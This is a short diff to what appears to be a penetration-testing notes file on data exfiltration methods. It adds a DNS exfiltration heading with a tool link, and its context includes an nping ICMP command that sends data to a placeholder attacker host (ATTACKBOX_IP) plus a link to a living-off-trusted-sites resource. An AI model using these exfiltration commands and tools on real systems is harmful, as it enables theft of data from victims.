@@ -71,3 +71,6 @@ sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
 
 ## via Websites
 [Checkout the LOTS Project](https://lots-project.com/)
+
+## DNS Exfiltration
+[https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil)
